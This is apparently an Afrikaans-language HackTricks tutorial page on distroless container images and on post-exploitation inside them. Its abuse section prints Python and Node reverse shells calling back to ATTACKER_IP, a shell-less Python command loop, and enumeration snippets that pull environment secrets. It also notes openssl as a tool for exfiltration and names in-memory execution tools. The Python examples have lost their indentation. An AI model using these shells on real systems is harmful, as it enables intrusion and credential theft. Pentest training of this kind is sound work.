# Distroless-houers

{{#include ../../../banners/hacktricks-training.md}}

## Oorsig

'N **distroless** container image is 'n image wat die **minimum runtime-komponente benodig om een spesifieke toepassing te laat loop** bevat, terwyl dit doelbewus die gewone distribusietoerusting soos package managers, shells, en groot stelle generiese userland-hulpmiddels verwyder. In die praktyk bevat distroless-images dikwels slegs die toepassings-binary of runtime, sy gedeelde biblioteke, sertifikaat-bundels, en 'n baie klein lêerstelselindeling.

Die punt is nie dat distroless 'n nuwe kern-isolasie-primitive is nie. Distroless is 'n **image-ontwerpstrategie**. Dit verander wat beskikbaar is **binne** die container-lêerstelsel, nie hoe die kern die container isoleer nie. Daardie onderskeid is belangrik, want distroless verskerp die omgewing hoofsaaklik deur te verminder wat 'n aanvaller kan gebruik nadat kode-uitvoering verkry is. Dit vervang nie namespaces, seccomp, capabilities, AppArmor, SELinux, of enige ander runtime-isolasie-meganisme nie.

## Waarom Distroless bestaan

Distroless-images word hoofsaaklik gebruik om te verminder:

- die grootte van die image
- die operasionele kompleksiteit van die image
- die aantal pakkette en binêre lêers wat kwesbaarhede kan bevat
- die aantal post-exploitation tools wat standaard aan 'n aanvaller beskikbaar is

Dit is waarom distroless-images gewild is in produksie-toepassingsimplementasies. 'n Container wat geen shell, geen package manager, en byna geen generiese toerusting bevat nie, is gewoonlik makliker om operasioneel te redeneer oor en moeiliker om interaktief te misbruik ná kompromie.

Voorbeelde van bekende distroless-styl image-families sluit in:

- Google's distroless images
- Chainguard hardened/minimal images

## Wat Distroless NIE beteken nie

'n Distroless-container is **nie**:

- automatically rootless
- automatically non-privileged
- automatically read-only
- automatically protected by seccomp, AppArmor, or SELinux
- automatically safe from container escape

Dit is steeds moontlik om 'n distroless-image te laat loop met `--privileged`, host namespace sharing, gevaarlike bind mounts, of 'n gemounte runtime-socket. In daardie scenario mag die image minimal wees, maar die container kan steeds katastrofies onseker wees. Distroless verander die **userland attack surface**, nie die **kern-vertrouensgrens** nie.

## Tipiese operasionele kenmerke

Wanneer jy 'n distroless-container kompromitteer, is die eerste ding wat jy gewoonlik opmerk dat algemene aannames ophou waar te wees. Daar mag geen `sh`, geen `bash`, geen `ls`, geen `id`, geen `cat` wees nie, en soms nie eens 'n libc-gebaseerde omgewing wat soos jou gewone tradecraft verwag optree nie. Dit beïnvloed beide offence en defense, omdat die gebrek aan toerusting debugging, incident response, en post-exploitation anders maak.

Die mees algemene patrone is:

- die toepassings-runtime bestaan, maar min anders
- shell-gebaseerde payloads misluk omdat daar geen shell is nie
- algemene enumeration one-liners misluk omdat die helper-binêre ontbreek
- lêerstelselbeskermings soos read-only rootfs of `noexec` op skryfbare tmpfs-liggings is dikwels ook teenwoordig

Daardie kombinasie is gewoonlik wat mense laat praat van "weaponizing distroless".

## Distroless en Post-Exploitation

Die hoof offensiewe uitdaging in 'n distroless-omgewing is nie altyd die aanvanklike RCE nie. Dit is dikwels wat daarna kom. As die uitgebuite workload kode-uitvoering in 'n taalkern soos Python, Node.js, Java, of Go gee, kan jy moontlik arbitêre logika uitvoer, maar nie deur die normale shell-sentriese workflows wat algemeen is in ander Linux-teikens nie.

Dit beteken post-exploitation skuif dikwels in een van drie rigtings:

1. **Gebruik die bestaande taal-runtime direk** om die omgewing te enumereer, sockets oop te maak, lêers te lees, of addisionele payloads te stage.
2. **Bring jou eie gereedskap in memory** indien die lêerstelsel read-only is of skryfbare liggings met `noexec` gemount is.
3. **Misbruik bestaande binêre lêers wat reeds in die image teenwoordig is** indien die toepassing of sy afhanglikhede iets onverwags nuttig insluit.

## Misbruik

### Enumereer die runtime wat jy reeds het

In baie distroless-containers is daar geen shell nie, maar daar is steeds 'n toepassings-runtime. As die teiken 'n Python-diens is, is Python daar. As die teiken Node.js is, is Node daar. Dit gee dikwels genoeg funksionaliteit om lêers te enumereer, omgewingveranderlikes te lees, reverse shells oop te maak, en in-memory uitvoering te stage sonder ooit `/bin/sh` aan te roep.

'n Eenvoudige voorbeeld met Python:
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
'n eenvoudige voorbeeld met Node.js:
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impak:

- herwinning van omgewingsveranderlikes, dikwels insluitend credentials of service endpoints
- lêerstelsel-enumerasie sonder `/bin/ls`
- identifikasie van skryfbare paaie en gemonteerde secrets

### Reverse Shell sonder `/bin/sh`

As die image nie `sh` of `bash` bevat nie, kan 'n klassieke shell-based reverse shell onmiddellik misluk. In daardie situasie, gebruik eerder die geïnstalleerde taal-runtime.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
As `/bin/sh` nie bestaan nie, vervang die finale reël met direkte, deur Python aangedrewe opdraguitvoering of 'n Python REPL-lus.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Nogmaals, as `/bin/sh` afwesig is, gebruik Node se filesystem-, process- en networking-APIs direk in plaas daarvan om 'n shell te spawn.

### Volledige Voorbeeld: No-Shell Python Command Loop

As die image Python het maar glad geen shell nie, is 'n eenvoudige interaktiewe lus dikwels genoeg om volle post-exploitation vermoë te behou:
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Hierdie vereis nie 'n interactive shell binary nie. Die impak is effens dieselfde as 'n basic shell vanuit die attacker's perspective: command execution, enumeration, en staging van verdere payloads deur die bestaande runtime.

### In-Memory Tool Execution

Distroless images word dikwels gekombineer met:

- `readOnlyRootFilesystem: true`
- writable but `noexec` tmpfs such as `/dev/shm`
- a lack of package management tools

Daardie kombinasie maak klassieke "download binary to disk and run it" workflows onbetroubaar. In daardie gevalle word memory execution techniques die hoof antwoord.

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Die mees relevante tegnieke daar is:

- `memfd_create` + `execve` via scripting runtimes
- DDexec / EverythingExec
- memexec
- memdlopen

### Existing Binaries Already In The Image

Sommige distroless images bevat steeds operasioneel nodige binaries wat ná kompromie nuttig kan wees. 'n Gereeld waargenome voorbeeld is `openssl`, omdat toepassings dit soms nodig het vir crypto- of TLS-related take.

A quick search pattern is:
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
As `openssl` teenwoordig is, kan dit gebruik word vir:

- uitgaande TLS-verbindinge
- data-ekfiltrasie oor 'n toegelate egress-kanaal
- staging van payload-data deur encoded/encrypted blobs

Die presiese misbruik hang af van wat werklik geïnstalleer is, maar die algemene idee is dat distroless nie "heeltemal geen gereedskap" beteken nie; dit beteken "baie minder gereedskap as in 'n normale distribusiebeeld".

## Kontroles

Die doel van hierdie kontroles is om te bepaal of die beeld in die praktyk werklik distroless is en watter runtime- of helper-binaries steeds beskikbaar is vir post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Wat hier interessant is:

- As daar geen shell bestaan nie maar 'n runtime soos Python of Node teenwoordig is, moet post-exploitation skuif na runtime-driven execution.
- As die root filesystem read-only is en `/dev/shm` skryfbaar maar `noexec`, word memory execution techniques veel meer relevant.
- As helper binaries soos `openssl`, `busybox`, of `java` bestaan, kan hulle genoeg funksionaliteit bied om verder toegang te bootstrap.

## Runtime-standaarde

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless style images | Minimale userland per ontwerp | Geen shell, geen package manager, slegs application/runtime dependencies | deur die toevoeging van ontfoutingslae, sidecar shells, busybox of gereedskap ingekopieer |
| Chainguard minimal images | Minimale userland per ontwerp | Verminderde package-oppervlak, dikwels gefokus op een runtime of diens | gebruik van `:latest-dev` of debug-variantes, gereedskap tydens build kopieer |
| Kubernetes workloads using distroless images | Hang af van Pod-konfigurasie | Distroless beïnvloed net userland; Pod se security-posture hang steeds af van die Pod spec en runtime-standaarde | byvoeging van ephemeral debug containers, host mounts, privileged Pod-instellings |
| Docker / Podman running distroless images | Hang af van run flags | Minimale filesystem, maar runtime-security hang steeds af van flags en daemon-konfigurasie | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |

Die kernpunt is dat distroless 'n **image property** is, nie 'n runtime-beskerming nie. Sy waarde kom van die vermindering van wat beskikbaar is binne die filesystem ná kompromittering.

## Verwante bladsye

Vir filesystem- en memory-execution bypasses wat algemeen benodig word in distroless omgewings:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Vir container runtime, socket, en mount abuse wat steeds van toepassing is op distroless workloads:

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
